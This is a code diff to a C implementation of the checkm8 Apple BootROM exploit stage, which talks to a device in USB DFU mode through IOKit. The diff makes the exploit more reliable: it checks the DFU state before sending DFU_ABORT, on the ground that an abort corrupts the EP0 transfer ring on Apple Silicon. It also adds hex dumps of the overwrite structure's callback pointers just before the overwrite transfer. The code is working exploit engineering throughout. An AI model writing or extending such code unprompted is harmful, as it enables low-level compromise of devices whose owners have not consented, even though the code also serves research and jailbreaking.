@@ -574,20 +574,39 @@ int checkm8_stage_patch(dfu_ctx_t *ctx)
             log_info("checkm8_stage_patch: IOKit leak ret=%d", kr);
         }
 
-        /* Step 0: DFU_ABORT → dfuIDLE.
-         * After stage 2's async cancel the device is likely stuck in
-         * dfuDNLOAD-SYNC, which rejects DFU_DNLOAD.  DFU_ABORT is a
-         * zero-data control transfer (SETUP+STATUS only) so it works
-         * even when EP0 OUT data TRBs are degraded. */
-        kr = IOKIT_XFER(0x21, DFU_REQ_ABORT, 0, 0,
-                        NULL, 0, USB_TIMEOUT_MS);
-        log_info("checkm8_stage_patch: DFU_ABORT ret=%d", kr);
+        /* Step 0: Ensure dfuIDLE before payload.
+         *
+         * Check the DFU state first.  After the libusb spray +
+         * CLR_STATUS the handler is typically in dfuIDLE already.
+         * DFU_ABORT in dfuIDLE is spec-legal (no-op), but on Apple
+         * Silicon XHCI the BootROM's handling of it corrupts the EP0
+         * transfer ring — subsequent GETSTATUS/DNLOAD fail with
+         * kIOReturnNotResponding or kIOReturnNotReady.  So we only
+         * send DFU_ABORT when we're NOT in dfuIDLE. */
+        {
+            uint8_t cur_state = 0xFF;
+            int gs_ret = IOKIT_XFER(0xA1, 0x05, 0, 0,
+                                    &cur_state, 1, 1000);
+            log_info("checkm8_stage_patch: GETSTATE ret=%d state=%u",
+                     gs_ret, cur_state);
 
-        kr = IOKIT_XFER(0xA1, 0x03, 0, 0,
-                        status_buf, 6, USB_TIMEOUT_MS);
-        log_info("checkm8_stage_patch: post-abort GETSTATUS ret=%d "
-                 "state=0x%02X", kr,
-                 kr >= 6 ? status_buf[4] : 0xFF);
+            if (gs_ret < 0 || cur_state != 2 /* dfuIDLE */) {
+                kr = IOKIT_XFER(0x21, DFU_REQ_ABORT, 0, 0,
+                                NULL, 0, USB_TIMEOUT_MS);
+                log_info("checkm8_stage_patch: DFU_ABORT ret=%d", kr);
+
+                usleep(10000); /* 10ms settle after ABORT */
+
+                kr = IOKIT_XFER(0xA1, 0x03, 0, 0,
+                                status_buf, 6, USB_TIMEOUT_MS);
+                log_info("checkm8_stage_patch: post-abort GETSTATUS "
+                         "ret=%d state=0x%02X", kr,
+                         kr >= 6 ? status_buf[4] : 0xFF);
+            } else {
+                log_info("checkm8_stage_patch: already dfuIDLE, "
+                         "skipping DFU_ABORT");
+            }
+        }
 
         /* Step 1: Payload via DFU_DNLOAD (before overwrite — STALL
          * kills EP0 on Apple Silicon XHCI) */
@@ -633,6 +652,30 @@ int checkm8_stage_patch(dfu_ctx_t *ctx)
         } else {
             checkm8_overwrite_t ow;
             build_overwrite_64(&ow, chip);
+
+            /* [diag] Hex dump overwrite data and callback addresses */
+            {
+                const uint8_t *p = (const uint8_t *)&ow;
+                log_info("checkm8_stage_patch: [diag] overwrite "
+                         "callback=0x%llx next=0x%llx "
+                         "(insecure_memory_base=0x%llx)",
+                         (unsigned long long)ow.callback.callback,
+                         (unsigned long long)ow.callback.next,
+                         (unsigned long long)chip->insecure_memory_base);
+                log_info("checkm8_stage_patch: [diag] overwrite hex "
+                         "(%zu bytes):", sizeof(ow));
+                for (size_t di = 0; di < sizeof(ow); di += 16) {
+                    size_t remain = sizeof(ow) - di;
+                    if (remain > 16) remain = 16;
+                    char hex[64];
+                    size_t hi = 0;
+                    for (size_t j = 0; j < remain; j++)
+                        hi += (size_t)snprintf(hex + hi, sizeof(hex) - hi,
+                                               "%02x ", p[di + j]);
+                    log_info("  +0x%02zx: %s", di, hex);
+                }
+            }
+
             log_info("checkm8_stage_patch: overwrite AArch64 "
                      "(%zu bytes)", sizeof(ow));
             kr = IOKIT_XFER(0x02, 0x03, 0, 0x80,
